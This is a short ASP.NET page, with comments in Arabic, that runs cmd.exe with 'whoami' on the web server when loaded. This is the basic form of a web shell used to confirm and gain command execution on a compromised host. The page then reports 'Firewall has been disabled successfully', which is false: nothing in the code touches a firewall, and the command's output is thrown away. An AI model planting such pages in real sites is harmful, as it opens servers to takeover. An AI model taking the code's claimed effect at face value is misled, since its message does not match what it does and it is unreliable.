<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    try
    {
        // إنشاء كائن عملية لتنفيذ الأمر
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c whoami";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;
        process.Start();

        // انتظار انتهاء التنفيذ
        process.WaitForExit();
        Response.Write("Firewall has been disabled successfully.");
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
%>
